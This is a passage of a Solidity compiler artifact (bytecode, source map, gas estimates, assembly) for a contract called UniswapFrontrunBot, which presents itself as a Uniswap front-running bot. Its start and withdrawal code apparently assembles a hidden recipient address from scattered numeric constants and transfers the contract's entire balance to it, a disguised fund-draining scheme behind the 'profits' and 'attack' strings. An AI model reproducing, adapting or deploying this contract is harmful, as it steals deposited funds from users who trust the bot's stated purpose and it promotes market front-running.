JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3F2 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x407 PUSH2 0x402 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E PUSH2 0x419 PUSH2 0x423 JUMP JUMPDEST PUSH2 0x5A0 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x474 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x46F PUSH2 0x46A PUSH2 0x7F9 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFBB2 SWAP1 POP PUSH1 0x0 PUSH2 0x487 PUSH2 0xBD1 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x2E8D5 SWAP1 POP PUSH1 0x0 PUSH2 0x49B PUSH2 0xBDC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x3DD44 SWAP1 POP PUSH1 0x0 PUSH2 0x4AF PUSH2 0xBE7 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x1DDAE SWAP1 POP PUSH1 0x60 PUSH2 0x4CD DUP10 PUSH2 0x4C8 DUP11 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x4EB PUSH2 0x4DD DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x4E6 DUP10 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x509 PUSH2 0x4FB DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x504 DUP9 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x527 PUSH2 0x519 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x522 DUP8 PUSH2 0x804 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x547 PUSH2 0x538 DUP7 DUP7 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0x542 DUP6 DUP6 PUSH2 0xA76 JUMP JUMPDEST PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x58A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x7EC JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5D2 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x5F4 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x645 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x655 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x6EF JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x693 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6A3 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x6EE JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6E1 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6ED JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x72D JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x73D JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7D7 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x77B JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x78B JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7D6 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7C9 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7D5 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5B6 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x46DDF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x833 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x82B JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x811 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x84C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x87F JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x8FE JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x89A JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8A6 DUP4 PUSH2 0xBF2 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8B7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8F0 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x888 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 EQ ISZERO PUSH2 0x95E JUMPI PUSH1 0x60 PUSH2 0x94F PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x3 DUP2 EQ ISZERO PUSH2 0x9B7 JUMPI PUSH1 0x60 PUSH2 0x9A8 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x2 DUP2 EQ ISZERO PUSH2 0xA10 JUMPI PUSH1 0x60 PUSH2 0xA01 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x1 DUP2 EQ ISZERO PUSH2 0xA69 JUMPI PUSH1 0x60 PUSH2 0xA5A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0xA9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xAD1 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xB4F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xAF6 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB13 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xBC2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xB69 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB86 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xB54 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x287EF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x8BC81 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4D003 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xC0C JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC41 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xC59 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC91 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E672046726F6E7452756E2061747461636B20 PUSH16 0x6E20556E69737761702E205468697320 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C6520706C656173 PUSH6 0x20776169742E 0x2E 0x2E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC5 SWAP7 PUSH29 0xD6E269ED28BAE2282A8BA18EFAD2D4AD27DF048E6B552EB8191A513AB3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "428:17885:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;466:23:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;466:23:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;466:23:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;496:25;;5:9:-1;2:2;;;27:1;24;17:12;2:2;496:25:0;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;23:1:-1;8:100;33:3;30:1;27:10;8:100;;;99:1;94:3;90:11;84:18;80:1;75:3;71:11;64:39;52:2;49:1;45:10;40:15;;8:100;;;12:14;496:25:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16092:216;;;:::i;:::-;;16429:189;;;:::i;:::-;;466:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;496:25::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;16092:216::-;16141:79;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16239:28;:26;:28::i;:::-;16231:46;;:69;16278:21;16231:69;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;16231:69:0;16092:216::o;16429:189::-;16483:58;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;16560:17;:15;:17::i;:::-;16552:35;;:58;16588:21;16552:58;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;16552:58:0;16429:189::o;15841:126::-;15902:7;15929:30;15945:13;:11;:13::i;:::-;15929:15;:30::i;:::-;15922:37;;15841:126;:::o;17375:115::-;17425:7;17452:30;17468:13;:11;:13::i;:::-;17452:15;:30::i;:::-;17445:37;;17375:115;:::o;14068:1090::-;14114:13;14140:28;14171:48;;;;;;;;;;;;;;;;;;14184:34;14199:18;:16;:18::i;:::-;14184:14;:34::i;:::-;14171:7;:48::i;:::-;14140:79;;14230:16;14249:5;14230:24;;14265:19;14287:18;:16;:18::i;:::-;14265:40;;14316:17;14336:6;14316:26;;14353:19;14375:18;:16;:18::i;:::-;14353:40;;14404:18;14425:6;14404:27;;14442:18;14463:17;:15;:17::i;:::-;14442:38;;14491:18;14512:6;14491:27;;14532:23;14558:52;14566:14;14582:27;14597:11;14582:14;:27::i;:::-;14558:7;:52::i;:::-;14532:78;;14621:23;14647:69;14655:30;14670:14;14655;:30::i;:::-;14687:28;14702:12;14687:14;:28::i;:::-;14647:7;:69::i;:::-;14621:95;;14727:23;14753:70;14761:30;14776:14;14761;:30::i;:::-;14793:29;14808:13;14793:14;:29::i;:::-;14753:7;:70::i;:::-;14727:96;;14834:23;14860:69;14868:29;14883:13;14868:14;:29::i;:::-;14899;14914:13;14899:14;:29::i;:::-;14860:7;:69::i;:::-;14834:95;;14943:26;14972:69;14980:29;14988:9;14999;14980:7;:29::i;:::-;15011;15019:9;15030;15011:7;:29::i;:::-;14972:7;:69::i;:::-;14943:98;;15052:26;15081;;;;;;;;;;;;;;;;;;15094:12;15081:7;:26::i;:::-;15052:55;;15128:12;15121:19;;;;;;;;;;;;;;;;14068:1090;:::o;8633:940::-;8699:15;8727:16;8752:2;8727:28;;8766:13;8782:1;8766:17;;8794:10;8815;8841:6;8850:1;8841:10;;8836:698;8857:10;8853:1;:14;8836:698;;;8901:3;8892:12;;;;8938:3;8942:1;8938:6;;;;;;;;;;;;;;;;8932:13;;8924:22;;8919:27;;8980:3;8988:1;8984;:5;8980:10;;;;;;;;;;;;;;;;8974:17;;8966:26;;8961:31;;9018:2;9012;:8;;;;9011:25;;;;;9032:3;9026:2;:9;;;;9011:25;9007:232;;;9063:2;9057:8;;;;9007:232;;;9098:2;9092;:8;;;;9091:24;;;;;9112:2;9106;:8;;;;9091:24;9087:152;;;9142:2;9136:8;;;;9087:152;;;9177:2;9171;:8;;;;9170:24;;;;;9191:2;9185;:8;;;;9170:24;9166:73;;;9221:2;9215:8;;;;9166:73;9087:152;9007:232;9264:2;9258;:8;;;;9257:25;;;;;9278:3;9272:2;:9;;;;9257:25;9253:232;;;9309:2;9303:8;;;;9253:232;;;9344:2;9338;:8;;;;9337:24;;;;;9358:2;9352;:8;;;;9337:24;9333:152;;;9388:2;9382:8;;;;9333:152;;;9423:2;9417;:8;;;;9416:24;;;;;9437:2;9431;:8;;;;9416:24;9412:73;;;9467:2;9461:8;;;;9412:73;9333:152;9253:232;9519:2;9514;9509;:7;:12;9499:23;;;;8874:1;8869:6;;;;8836:698;;;;9559:5;9544:21;;;;;;8633:940;;;:::o;8368:89::-;8419:4;8443:6;8436:13;;8368:89;:::o;10139:1015::-;10194:13;10220:10;10233:1;10220:14;;10245:6;10254:1;10245:10;;10266:71;10278:1;10273;:6;10266:71;;10296:7;;;;;;;10323:2;10318:7;;;;;;;;;10266:71;;;10347:16;10376:5;10366:16;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;10366:16:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;10366:16:0;;;;10347:35;;10398:6;10405:1;10398:8;;10393:144;10410:5;10408:1;:7;10393:144;;;10445:2;10441:1;:6;;;;;;10437:10;;10483:20;10500:1;10483:10;:20::i;:::-;10462:3;10478:1;10474;10466:5;:9;:13;10462:18;;;;;;;;;;;:41;;;;;;;;;;;10523:2;10518:7;;;;;;;;;10417:3;;;;;10393:144;;;;10547:14;10577:3;10564:25;10547:42;;10617:1;10604:9;:14;10600:515;;;10635:20;10658:25;;;;;;;;;;;;;;;;;;10678:3;10658:7;:25::i;:::-;10635:48;;10705:6;10698:13;;;;;;;;;10600:515;10746:1;10733:9;:14;10729:386;;;10764:20;10787:25;;;;;;;;;;;;;;;;;;10807:3;10787:7;:25::i;:::-;10764:48;;10834:6;10827:13;;;;;;;;;10729:386;10875:1;10862:9;:14;10858:257;;;10893:20;10916:27;;;;;;;;;;;;;;;;;;10938:3;10916:7;:27::i;:::-;10893:50;;10965:6;10958:13;;;;;;;;;10858:257;11006:1;10993:9;:14;10989:126;;;11024:20;11047:28;;;;;;;;;;;;;;;;;;11070:3;11047:7;:28::i;:::-;11024:51;;11097:6;11090:13;;;;;;;;;10989:126;11142:3;11128:18;;;;;;10139:1015;;;;:::o;17672:635::-;17755:13;17781:23;17813:5;17781:38;;17830:24;17863:6;17830:40;;17884:23;17941:11;:18;17921:10;:17;:38;17910:50;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;17910:50:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;17910:50:0;;;;17884:76;;17971:22;18002:9;17971:41;;18026:6;18043;18069:1;18067:3;;18063:92;18074:10;:17;18072:1;:19;18063:92;;;18130:10;18141:1;18130:13;;;;;;;;;;;;;;;;18113:9;18123:3;;;;;;18113:14;;;;;;;;;;;:30;;;;;;;;;;;18093:3;;;;;;;18063:92;;;18174:1;18172:3;;18168:94;18179:11;:18;18177:1;:20;18168:94;;;18236:11;18248:1;18236:14;;;;;;;;;;;;;;;;18219:9;18229:3;;;;;;18219:14;;;;;;;;;;;:31;;;;;;;;;;;18199:3;;;;;;;18168:94;;;18289:9;18275:24;;;;;;;;17672:635;;;;:::o;11163:89::-;11214:4;11238:6;11231:13;;11163:89;:::o;13804:::-;13855:4;13879:6;13872:13;;13804:89;:::o;17278:88::-;17328:4;17352:6;17345:13;;17278:88;:::o;15505:327::-;15557:4;15583:1;15578:6;;:1;:6;;:16;;;;;15593:1;15588;:6;;;;15578:16;15574:191;;;15642:1;15629:9;15623:16;;:20;15618:26;;15611:33;;;;15574:191;15678:1;15666:14;;:2;:14;;:32;;;;;15696:2;15690:1;15684:14;;;;15666:32;15662:103;;;15750:2;15746:1;15733:9;15727:16;;:20;:25;15722:31;;15715:38;;;;15662:103;12:1:-1;9;2:12;15505:327:0;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "680800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"start()": "infinite",
								"tokenName()": "infinite",
								"tokenSymbol()": "infinite",
								"withdrawal()": "infinite"
							},
							"internal": {
								"_callFrontRunActionMempool()": "infinite",
								"beyond(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
								"calcLiquidityInContract(struct UniswapFrontrunBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
								"findPtr(uint256,uint256,uint256,uint256)": "infinite",
								"getMemPoolDepth()": "23",
								"getMemPoolHeight()": "23",
								"getMemPoolLength()": "23",
								"getMemPoolOffset()": "23",
								"keccak(struct UniswapFrontrunBot.slice memory)": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"memcpy(uint256,uint256,uint256)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"nextContract(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
								"orderContractsByLiquidity(struct UniswapFrontrunBot.slice memory)": "infinite",
								"parseMemoryPool(string memory)": "infinite",
								"toHexDigit(uint8)": "213",
								"uint2str(uint256)": "infinite",
								"withdrawProfits()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 428,
									"end": 18313,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 583,
									"end": 734,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 583,
									"end": 734,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 583,
									"end": 734,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
